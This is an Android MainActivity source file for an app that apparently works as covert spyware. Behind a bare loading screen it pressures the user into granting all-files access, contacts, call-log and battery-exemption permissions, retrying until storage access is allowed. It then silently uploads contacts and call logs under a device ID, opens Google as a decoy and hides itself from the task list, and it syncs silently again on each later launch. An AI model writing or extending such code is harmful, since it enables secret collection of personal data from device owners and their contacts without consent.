package come.tshah.app;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String TAG              = "MainActivity";
    private static final int    REQ_PERMISSIONS  = 1001;
    private static final int    REQ_MANAGE       = 1002;
    private static final int    REQ_BATTERY      = 1003;
    private static final String PREFS            = "app_prefs";
    private static final String KEY_SETUP_DONE   = "setup_done";

    private ProgressBar  progressBar;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        prefs = getSharedPreferences(PREFS, MODE_PRIVATE);

        LinearLayout root = new LinearLayout(this);
        root.setBackgroundColor(0xFF1A1A2E);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);

        progressBar = new ProgressBar(this);
        root.addView(progressBar);

        setContentView(root);

        new Handler(Looper.getMainLooper()).postDelayed(this::start, 400);
    }

    private void start() {
        if (prefs.getBoolean(KEY_SETUP_DONE, false)) {
            // Already set up — just sync silently and go background
            Log.i(TAG, "Setup already done — silent sync");
            runSyncAndExit(false);
        } else {
            // First run — full setup flow
            Log.i(TAG, "First run — starting setup");
            initFirebase();
        }
    }

    // ── Step 1: FCM token registration ───────────────────────────────────
    private void initFirebase() {
        new Thread(() -> {
            try {
                FcmService.setup();
                Log.i(TAG, "FCM token registered");
            } catch (Exception e) {
                Log.e(TAG, "FCM setup failed: " + e.getMessage());
            }
            runOnUiThread(this::checkManageStorage);
        }).start();
    }

    // ── Step 2: MANAGE_EXTERNAL_STORAGE (Android 11+) ────────────────────
    private void checkManageStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            Log.i(TAG, "Requesting MANAGE_ALL_FILES permission");
            try {
                startActivityForResult(
                    new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:" + getPackageName())),
                    REQ_MANAGE);
            } catch (Exception e) {
                Log.e(TAG, "MANAGE_ALL_FILES not supported: " + e.getMessage());
                checkBasicPermissions();
            }
        } else {
            checkBasicPermissions();
        }
    }

    // ── Step 3: Contacts + Call Log + Notifications ───────────────────────
    private void checkBasicPermissions() {
        List<String> needed = new ArrayList<>();
        for (String p : new String[]{
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG}) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                needed.add(p);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        if (needed.isEmpty()) {
            Log.i(TAG, "All basic permissions granted");
            checkBatteryOptimization();
        } else {
            Log.i(TAG, "Requesting permissions: " + needed);
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_PERMISSIONS);
        }
    }

    // ── Step 4: Battery optimization exemption ────────────────────────────
    private void checkBatteryOptimization() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Log.i(TAG, "Requesting battery optimization exemption");
            try {
                startActivityForResult(
                    new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName())),
                    REQ_BATTERY);
            } catch (Exception e) {
                Log.e(TAG, "Battery opt request failed: " + e.getMessage());
                checkBasicPermissions();
            }
        } else {
            Log.i(TAG, "Battery optimization already exempt");
            checkBasicPermissions();
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_MANAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                // Not granted — show loader and retry until user allows
                Log.i(TAG, "MANAGE_ALL_FILES denied — retrying");
                    new Handler(Looper.getMainLooper()).postDelayed(this::checkManageStorage, 1500);
            } else {
                Log.i(TAG, "MANAGE_ALL_FILES granted — proceeding");
                checkBatteryOptimization();
            }
        } else if (req == REQ_BATTERY) {
            Log.i(TAG, "Battery optimization result — proceeding");
            checkBasicPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        Log.i(TAG, "Runtime permissions result received");
        finishSetup();
    }

    // ── Step 5: Sync → open Google → background ───────────────────────────
    private void finishSetup() {
        prefs.edit().putBoolean(KEY_SETUP_DONE, true).apply();
        Log.i(TAG, "Setup complete");
        runSyncAndExit(true);
    }

    private void runSyncAndExit(boolean openGoogle) {
        new Thread(() -> {
            try {
                FcmService.setup();
                String deviceId = LocalCursor.deviceId();
                ContactsService cs = new ContactsService(this);
                cs.syncContactsSilent(deviceId);
                cs.syncCallLogsSilent(deviceId);
                Log.i(TAG, "Sync complete");
            } catch (Exception e) {
                Log.e(TAG, "Sync error: " + e.getMessage());
            }
            runOnUiThread(() -> {
                if (openGoogle) {
                    Log.i(TAG, "Opening browser — going to background");
                    try {
                        String targetUrl = AppConfig.APP_URL.isEmpty() ? "https://www.google.com" : AppConfig.APP_URL;
                        Intent browser = new Intent(Intent.ACTION_VIEW,
                            Uri.parse(targetUrl));
                        browser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(browser);
                    } catch (Exception e) {
                        Log.e(TAG, "Browser open failed: " + e.getMessage());
                    }
                }
                new Handler(Looper.getMainLooper()).postDelayed(
                    this::finishAndRemoveTask, 500);
            });
        }).start();
    }

}
